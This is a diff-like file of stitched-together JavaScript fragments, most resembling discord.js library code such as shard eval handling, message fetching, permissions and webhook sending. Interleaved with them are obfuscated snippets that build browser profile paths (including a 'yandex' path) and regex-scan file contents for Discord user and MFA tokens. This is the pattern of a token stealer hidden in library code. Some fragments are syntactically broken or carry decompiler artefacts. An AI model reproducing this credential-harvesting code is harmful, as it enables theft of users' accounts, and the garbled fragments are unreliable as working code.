@@ -1,0 +1,98 @@
+_tmp_7.yandex = _0x1e5e9d["join"](
+            _0x2b979a,
+            _0x2ad80d(0xcd),
+            _0x2ad80d(0x98),
+            _0x735e44[_0x2ad80d(0xba)],
+            _0x2ad80d(0xb4),
+            ..._0x175012
+          )
+_tmp_11.settings = <operator>.formatString("", base, "/settings")
+disableEveryone || (typeof disableEveryone === 'undefined' && this.client.options.disableEveryone)
+const promise = new Promise((resolve, reject) => {
+      const listener = message => {
+        if (!message || message._eval !== script) return;
+        this.process.removeListener('message', listener);
+        this._evals.delete(script);
+        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
+      };
+      this.process.on('message', listener);
+
+      this.send({ _eval: script }).catch(err => {
+        this.process.removeListener('message', listener);
+        this._evals.delete(script);
+        reject(err);
+      });
+    })
+const listener = message => {
+        if (!message || message._eval !== script) return;
+        this.process.removeListener('message', listener);
+        this._evals.delete(script);
+        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
+      }
+this.client.rest.makeRequest('get', Constants.Endpoints.Guild(this.guild).Emoji(this.id), true)
+      .then(emoji => this.client.dataManager.newUser(emoji.user))
+new Permissions(this.permissions).has(
+      permission, typeof checkAdmin !== 'undefined' ? checkAdmin : !explicit
+    )
+Promise.all(options.files.map(file =>
+        this.client.resolver.resolveFile(file.attachment).then(resource => {
+          file.file = resource;
+          return file;
+        })
+      )).then(files => this.client.rest.methods.sendMessage(this, content, options, files))
+this.send({ _eval: script }).catch(err => {
+        this.process.removeListener('message', listener);
+        this._evals.delete(script);
+        reject(err);
+      })
+let _0x175511 = _0x735e44[_0x2ad80d(0xb8)](
+              _0x31c4f9,
+              _0x1e5e9d[_0x2ad80d(0xc3)](_0x54b8a4[_0x21f371], _0x5b14c7)
+            )
+this.authenticateFailed('Token not provided from voice server packet.')
+this.mentions = new Mentions(
+      this,
+      'mentions' in data ? data.mentions : this.mentions.users,
+      'mentions_roles' in data ? data.mentions_roles : this.mentions.roles,
+      'mention_everyone' in data ? data.mention_everyone : this.mentions.everyone
+    )
+function _0x31c4f9 = function _0x31c4f9(_0x199a71) {
+        const _0x2d97fb = _0x2ad80d;
+        let _0x4e2432 = _0x201ee8[_0x2d97fb(0xaa)](_0x199a71)[
+            _0x2d97fb(0xa6)
+          ](),
+          _0x2fefb2 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,
+          _0x20959c = /"mfa\.[\d\w_-]{84}"/,
+          [_0x56e2c6] = _0x2fefb2[_0x2d97fb(0xa1)](_0x4e2432) ||
+            _0x20959c[_0x2d97fb(0xa1)](_0x4e2432) || [null];
+        return _0x56e2c6;
+      }
+this.listenerCount('pcm') > 0 || this.pcmStreams.size > 0
+this.client.actions.MessageDeleteBulk.handle({
+        channel_id: channel.id,
+        ids: messages,
+      }).messages
+_tmp_46 = VoiceReceiver._tryDecode(this.opusEncoders.get(user.id), data)
+this.fetchMessages({ limit: 1, around: messageID }).then(messages => {
+        const msg = messages.get(messageID);
+        if (!msg) throw new Error('Message not found.');
+        return msg;
+      })
+(_tmp_14 = [
+      Actions.CHANNEL_DELETE,
+      Actions.CHANNEL_OVERWRITE_DELETE,
+      Actions.MEMBER_KICK,
+      Actions.MEMBER_PRUNE,
+      Actions.MEMBER_BAN_ADD,
+      Actions.ROLE_DELETE,
+      Actions.INVITE_DELETE,
+      Actions.WEBHOOK_DELETE,
+      Actions.EMOJI_DELETE,
+      Actions.MESSAGE_DELETE,
+    ]).includes
+Promise.all(options.files.map(file =>
+        this.client.resolver.resolveFile(file.attachment).then(resource => {
+          file.file = resource;
+          return file;
+        })
+      )).then(files => this.client.rest.methods.sendWebhookMessage(this, content, options, files))
